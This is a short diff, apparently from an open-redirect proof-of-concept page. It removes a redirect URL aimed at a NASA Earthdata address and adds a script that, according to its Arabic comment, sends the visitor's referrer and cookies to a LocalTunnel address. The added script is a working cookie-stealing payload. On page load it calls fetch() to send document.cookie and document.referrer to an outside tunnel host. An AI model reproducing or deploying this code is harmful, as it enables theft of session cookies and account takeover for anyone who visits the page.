@@ -1,1 +1,6 @@
-https://earthdata.nasa.gov/?redirect=https://zaid111a.github.io/open-redirect-poc/
+<script>
+  // إرسال referrer و cookie إلى LocalTunnel
+  fetch("https://bright-poems-lay.loca.lt/?ref=" + encodeURIComponent(document.referrer) + "&cookie=" + encodeURIComponent(document.cookie), {
+    mode: "no-cors"
+  });
+</script>
